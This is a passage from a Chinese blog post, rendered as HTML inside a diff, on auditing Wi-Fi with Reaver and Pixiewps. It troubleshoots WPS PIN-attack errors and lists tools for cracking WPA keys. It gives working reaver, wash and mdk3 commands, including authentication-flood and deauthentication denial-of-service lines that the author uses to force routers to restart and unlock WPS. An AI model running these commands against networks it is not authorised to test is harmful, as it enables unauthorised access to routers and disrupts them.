class="comment">[+]</span> Sending EAPOL START request</span><br><span class="line"><span class="comment">[!]</span> WARNING: Receive timeout occurred</span><br><span class="line"><span class="comment">[+]</span> Sending EAPOL START request</span><br><span class="line"><span class="comment">[!]</span> WARNING: Receive timeout occurred</span><br><span class="line"><span class="comment">[+]</span> Sending EAPOL START request</span><br><span class="line"><span class="comment">[!]</span> WARNING: Receive timeout occurred</span><br><span class="line"><span class="comment">[+]</span> Sending EAPOL START request</span><br><span class="line"><span class="comment">[!]</span> WARNING: Receive timeout occurred</span><br><span class="line"><span class="comment">[+]</span> Sending EAPOL START request</span><br></pre></td></tr></table></figure>
+<p>一般我的做法是关闭并取下 USB 网卡，过一段时间</p>
+<h2 id="WPS_transaction_failed_(code:_0x02)">WPS transaction failed (code: 0x02)</h2><p>可能的错误原因[10]</p>
+<ol>
+<li>Low Signal Strength </li>
+<li>Weak Firewall of Router or Modem </li>
+<li>WPS is Locked </li>
+</ol>
+<h3 id="Low_Signal_Strength">Low Signal Strength</h3><p>If you have low signals i.e above -80dbi or below 20dbi then you must have such type of error because reaver is unable to link its wps pin connection with router.</p>
+<h3 id="Weak_Firewall_of_Router_or_Modem">Weak Firewall of Router or Modem</h3><p>Reaver 的 pin attempts 过于频繁，导致触发路由器崩溃来不及处理。</p>
+<p>解决： 使用 -d 来降低试探频率</p>
+<p>You can command reaver to wait for few seconds after each pin attempt for this you will use “ -d 3 “ after your command and 3 means to wait for 3 seconds and after inject the another pin.</p>
+<p>Example is below<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reaver -<span class="tag">i</span> mon0 -<span class="tag">b</span> BSSID -c Channel No -d <span class="number">3</span> -w -vv</span><br></pre></td></tr></table></figure></p>
+<h3 id="WPS_is_locked">WPS is locked</h3><p>可以通过 reaver 自带的嗅探工具 wash 来检测附近的 AP 是否处于被锁状态。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wash -<span class="tag">i</span> mon0</span><br></pre></td></tr></table></figure>
+<p>You can also try my trick which i use to unlock some routers who have locked wps. i usually dos attack on routers which cause the routers to restart themselves.</p>
+<p>I Perform this attack using MDK3 and you can also give it a try by typing the below command<br>验证请求拒绝服务攻击<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdk3 mon0 <span class="tag">a</span> -<span class="tag">a</span> bssid</span><br></pre></td></tr></table></figure></p>
+<p>this will dos the router and cause him to restart himself and when its restarted , wps will be unlocked.</p>
+<p>或者进行连接解除攻击，最好设置一下黑名单和白名单。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdk<span class="number">3</span> mo<span class="label">n0</span> d</span><br></pre></td></tr></table></figure>
+<h3 id="补充">补充</h3><blockquote>
+<p>不过我对 wash 的测试一直是失败的,没获取到任何信息。<br>测试过的网卡芯片包括<br>Intel Centrino Advanced-N 6230 AGN<br>ATHEROS USB2.0 WLAN<br>相关的驱动分别为<br>iwlwifi<br>ath9k</p>
+</blockquote>
+<p>错误log<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Wash v1.5.2 WiFi Protected Setup Scan Tool</span><br><span class="line">Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;</span><br><span class="line">mod by t6<span class="emphasis">_x &lt;t6_</span>x@hotmail.com&gt; &amp; DataHead &amp; Soxrok2212 &amp; Wiire &amp; kib0rg</span><br><span class="line"></span><br><span class="line"><span class="header">BSSID              Channel  RSSI  WPS Version  WPS Locked  ESSID</span><br><span class="line">--------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure></p>
+<p><a href="https://evilzone.org/tutorials/wireless-auditing-with-kali-linux-aircrack-ng-reaver-and-pixiewps/" target="_blank" rel="external">https://evilzone.org/tutorials/wireless-auditing-with-kali-linux-aircrack-ng-reaver-and-pixiewps/</a></p>
+<p><a href="https://forums.reaversystems.com/index.php?threads/pixie-dust-wps.246/" target="_blank" rel="external">https://forums.reaversystems.com/index.php?threads/pixie-dust-wps.246/</a></p>
+<p><a href="http://sniperhaxx.blogspot.com/2014/11/wps-transaction-failed-code-0x02-reaver.html" target="_blank" rel="external">http://sniperhaxx.blogspot.com/2014/11/wps-transaction-failed-code-0x02-reaver.html</a></p>
+<h1 id="其他无线安全审计总结">其他无线安全审计总结</h1><h2 id="常用的工具">常用的工具</h2><ol>
+<li><code>aircrack-ng</code>  aircrack 系列套件</li>
+<li><code>reaver &amp; wash</code>   WPS攻击</li>
+<li><code>pixiewps</code> 离线WPS攻击</li>
+<li><code>minidwep-gtk</code> 水滴</li>
+<li><code>beini</code> 奶瓶</li>
+<li><code>mdk3</code> 伪ssid工具</li>
+<li><code>打气筒</code> 经常有提到，但我不知道原名叫什么</li>
+<li><code>wifislax</code> 钓鱼伪AP工具</li>
+</ol>
+<h2 id="传统_WPA_密钥破解方法">传统 WPA 密钥破解方法</h2><p>这个<a href="http://v.youku.com/v_show/id_XNzI0NDE4MDI4/v.swf.html" target="_blank" rel="external">视频</a>总结得很好.</p>
+<p>你需要强大的字典，以及强大的运算能力，可以利用hash table(彩虹表)以及显卡来加速运算。</p>
+<p>利用 hash-table(彩虹表) 的工具叫 <code>cowpatty</code></p>
+<p>GPU加速运算则是利用 <code>pyrit</code></p>
+<h1 id="参考资料">参考资料</h1><p>[1] <a href="http://wenku.baidu.com/link?url=hT5goCfSmeYy9XjuAQpnVcfHj_xIGYb0FdZPnThJsqOFl69eLnv0z4I5h06G9xXQU-aVP2Mt6evCZrPrA9DmvsSGinGHmkB8f43Xa2Dti3a" target="_blank" rel="external">Stefan Viehbock的报告</a></p>
+<p>[2] <a href="https://sviehb.wordpress.com/" target="_blank" rel="external">Stefan Viehbock的博客</a></p>
+<p>[3] <a href="http://www.myhack58.com/Article/sort097/2012/34264.htm" target="_blank" rel="external">关于背景的报道</a></p>
+<p>[4] <a href="http://www.freebuf.com/tools/75015.html" target="_blank" rel="external">Kali 2.0中无线安全工具更新特性（浅谈pixie结合reaver的攻击原理）</a></p>
+<p>[5] <a href="http://forum.anywlan.com/thread-361854-1-3.html" target="_blank" rel="external">pixiewps,受影响芯片列表</a></p>
+<p>[5.1] <a href="http://routersecurity.org/bugs.php" target="_blank" rel="external">受影响列表2 关键字dsut</a></p>
+<p>[5.2] <a href="https://forums.reaversystems.com/index.php?threads/pixie-dust-wps.246/" target="_blank" rel="external">受影响列表3</a></p>
+<p>[6] t6x的reaver项目 <a href="https://github.com/t6x/reaver-wps-fork-t6x/" target="_blank" rel="external">github</a></p>
+<p>[7] pixiewps项目 <a href="https://github.com/wiire/pixiewps" target="_blank" rel="external">github</a></p>
+<p>[8] <a href="https://evilzone.org/tutorials/wireless-auditing-with-kali-linux-aircrack-ng-reaver-and-pixiewps/" target="_blank" rel="external">Wireless Auditing with Kali Linux - aircrack-ng, reaver, and pixiewps</a></p>
+<p>[9] <a href="https://www.kali.org/penetration-testing/pixiewps-reaver-aircrack-ng-updates/" target="_blank" rel="external">Kali更新说明，附pixie dust attack原理</a></p>
+<p>[9.1] <a href="http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf" target="_blank" rel="external">dust attack slide - Dominique Bongard@twitter</a></p>
+<p>[10] <a href="http://sniperhaxx.blogspot.com/2014/11/wps-transaction-failed-code-0x02-reaver.html" target="_blank" rel="external">reaver 出现0x02错误码的解决方法</a></p>
+<p>[11] <a href="http://forum.ubuntu.org.cn/viewtopic.php?t=459198" target="_blank" rel="external">reaver 出现0x04错误码的包降级解决方法</a></p>
+<p>[12] <a href="http://forum.ubuntu.org.cn/viewtopic.php?t=459198" target="_blank" rel="external">libpcap0.8降级 解决方法</a></p>
+<p>[13] <a href="http://blog.zts1993.com/5697.html" target="_blank" rel="external">Reaver v1.4 用法整理 含高级参数说明</a></p>
+<p>[14] <a href="http://www.eeboard.com/bbs/thread-13491-1-1.html" target="_blank" rel="external">Raspberry Pi 与 reaver 整合</a></p>
+<p>[14.1] <a href="http://bao3.blogspot.com/?q=reaver&amp;view=classic" target="_blank" rel="external">原文需科学上网</a></p>
+<p>[15] <a href="http://forum.cnsec.org/thread-91855-1-1.html" target="_blank" rel="external">WPS/PIN 总结，腾达，磊科部分型号的PIN生成算法曝光</a></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/信息安全/"> #信息安全 </a>
+          
+            <a href="/tags/无线安全/"> #无线安全 </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/08/19/remote-desktop/">N次失败的尝试，Android 连接 Ubuntu 远程桌面配置</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2015/08/19/reaver-tutorial/"
+               data-title="利用 reaver 进行无线安全审计" data-url="http://blkstone.github.io/2015/08/19/reaver-tutorial/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">28</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">6</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">16</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="your-twitter-url" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="your-weibo-url" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="your-douban-url" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="your-zhihu-url" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#测试环境"><span class="nav-number">2.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Dust_Attack_受影响芯片列表"><span class="nav-number">3.</span> <span class="nav-text">Dust Attack 受影响芯片列表</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安装_reaver_1-5-2"><span class="nav-number">4.</span> <span class="nav-text">安装 reaver 1.5.2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安装_pixiewps"><span class="nav-number">5.</span> <span class="nav-text">安装 pixiewps</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结合_dust_attack_的_reaver"><span class="nav-number">6.</span> <span class="nav-text">结合 dust attack 的 reaver</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reaver_命令详解"><span class="nav-number">7.</span> <span class="nav-text">reaver 命令详解</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#可能遇到的问题"><span class="nav-number">8.</span> <span class="nav-text">可能遇到的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WPS_transaction_failed_(code:_0x04)"><span class="nav-number">8.1.</span> <span class="nav-text">WPS transaction failed (code: 0x04)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02与0x03混合报错"><span class="nav-number">8.2.</span> <span class="nav-text">0x02与0x03混合报错</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#长期警告无法Associate"><span class="nav-number">8.3.</span> <span class="nav-text">长期警告无法Associate</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#长期警告_Receive_timeout"><span class="nav-number">8.4.</span> <span class="nav-text">长期警告 Receive timeout</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WPS_transaction_failed_(code:_0x02)"><span class="nav-number">8.5.</span> <span class="nav-text">WPS transaction failed (code: 0x02)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low_Signal_Strength"><span class="nav-number">8.5.1.</span> <span class="nav-text">Low Signal Strength</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Weak_Firewall_of_Router_or_Modem"><span class="nav-number">8.5.2.</span> <span class="nav-text">Weak Firewall of Router or Modem</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WPS_is_locked"><span class="nav-number">8.5.3.</span> <span class="nav-text">WPS is locked</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补充"><span class="nav-number">8.5.4.</span> <span class="nav-text">补充</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其他无线安全审计总结"><span class="nav-number">9.</span> <span class="nav-text">其他无线安全审计总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#常用的工具"><span class="nav-number">9.1.</span> <span class="nav-text">常用的工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#传统_WPA_密钥破解方法"><span class="nav-number">9.2.</span> <span class="nav-text">传统 WPA 密钥破解方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">10.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp; 
+  2015
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
